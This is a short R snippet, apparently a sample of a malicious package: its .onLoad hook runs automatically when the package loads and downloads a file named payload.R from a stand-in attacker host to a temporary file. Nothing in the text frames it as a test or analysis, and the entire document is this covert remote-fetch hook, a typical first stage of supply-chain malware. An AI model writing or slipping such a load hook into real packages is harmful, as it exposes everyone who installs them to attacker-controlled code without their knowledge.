.onLoad = function(libname, pkgname) {
  download.file("https://attacker.com/payload.R", tempfile())
}
